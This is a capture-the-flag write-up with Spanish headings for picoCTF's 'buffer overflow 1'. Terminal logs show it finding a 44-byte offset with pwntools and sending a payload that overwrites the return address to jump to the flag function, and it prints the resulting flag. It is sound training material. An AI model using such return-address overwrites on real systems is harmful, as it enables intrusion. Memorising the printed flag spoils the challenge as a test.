# buffer overflow 1

## Descripción
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln). You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 63713`
## Pistas

## Solución
```bash
┌──(kali㉿kali)-[~]
└─$ cd Documents/binaryExplloitation/bufferflow1 
                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/binaryExplloitation/bufferflow1]
└─$ ls
vuln  vuln.c
                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/binaryExplloitation/bufferflow1]
└─$ echo 'aaaaaaaaaaaaaaaaaaaaaaaaaaa' | ./vuln                                                   
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/binaryExplloitation/bufferflow1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents/binaryExplloitation/bufferflow1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln       
┌──(kali㉿kali)-[~/Documents/binaryExplloitation/bufferflow1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 64273                   
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}   

┌──(kali㉿kali)-[~]
└─$ python3                       
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> 

```
## Bandera
picoCTF{addr3ss3s_ar3_3asy_a8284f4f} 

## Notas Adicionales 

## Referencias